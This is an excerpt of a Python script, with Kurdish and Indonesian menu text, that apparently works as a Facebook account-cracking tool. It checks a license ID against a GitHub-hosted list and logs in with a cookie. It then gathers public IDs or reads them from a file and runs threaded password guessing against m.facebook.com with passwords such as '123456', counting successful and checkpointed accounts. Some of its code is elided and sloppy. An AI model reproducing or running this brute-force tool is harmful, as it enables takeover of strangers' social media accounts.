...
def chk():
  ...
  print("\n\n\x1b[37;1m  ID TI BRA PNERA BO TANYA : \033[94m"+id) 

  try: 

    httpCaht = requests.get("https://raw.githubusercontent.com/tiger-kurd/tanya/main/active.txt").text 

    if id in httpCaht: 

      print("\033[92m  ID EA KAT ACTIVE BO.........\033[97m") 
      ...
      print("\033[0;96m Id kat active nya Tkaya bo Active krdn NAME bnera bo telegram @py_TANYA") 
...
def login_lagi334():
	try:
		...
		print(f'\033[0m╰─ TKAYA COOKIE NWE DABNE')
		exit()
...
def menu(n,t):
	clear_layar()
	print(logo(n)+f'\n')
	print(f" {P}{hh}( 1 ){P} CRACK ID PUBLIK     ")
	print(f" {P}{hh}( 2 ){P} CRACK FILE PATH   ")
	ask = input(f' [{hh}>>{P}] HALBZHIRA : ')
	print(' ─────────────────────────────')
	if ask in ['1','01']:crack_masal(t,c)
	elif ask in ['8','08']:crack_masal5(t,c)
	...
	try:
		...
		for x in data.find_all("table"):
			...
			if ">" in par.split(" ") or "mengajukan" in par.split(" "):
				...
				if " Mengajukan Pertanyaan ." in par:nama = par.prentreplace(" Mengajukan Pertanyaan .","")
...
def atur_atur():
	print(f"\r{P} ─────────────────────────────")
	ro = input(f' {hh}{P} MOBILE [ 1 ] =  ')
	if ro in ['1','01']:metode.append('mobile')
	elif ro in ['3','03']:metode.append('mbasic')
	else:metode.append('mobile')
	print(f"{P} ─────────────────────────────")
	ch = input(f' [{hh}RANDOM{P}] [ R ] =  ')
	if ch in ['o','3']:
		for x in dump:
			id.append(x)
	elif ch in ['n','N']:
	...
	if cp in ['y','Y','ya','Ya','3','03','yy','YA','yA']:
		cepeh.append('ya')
	print(f"{P} ─────────────────────────────")
	apk = input(f' [{hh}!{P}] VIEW APPLICATION >>[{hh}[ Y ] = {P} ')
	if apk in ['y','Ya','ya','3']:akunok.append('apk')
	else:akunok.append('coki')
	print(f"{P} ─────────────────────────────")
	if ch in ['3','03']:gabung()
	elif ch in ['3','3']:otomatis()
...
def gabung():
	...
	A = ["123456"]
	print(f"{P} ─────────────────────────────")
	B = input(f' [{hh}>{P}] AUTO PASSSWORD :  [{hh}{P}] : ').split(',')
	if ',' in str(C):
	...
	with tred(max_workers=30) as babas:
		for akun in id:
			...
			if 'mobile' in metode:
				...
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r [{hh}<{P}] CRACK TAWAW BO >> OK:{ok} Jumlah CP:{cp} ')
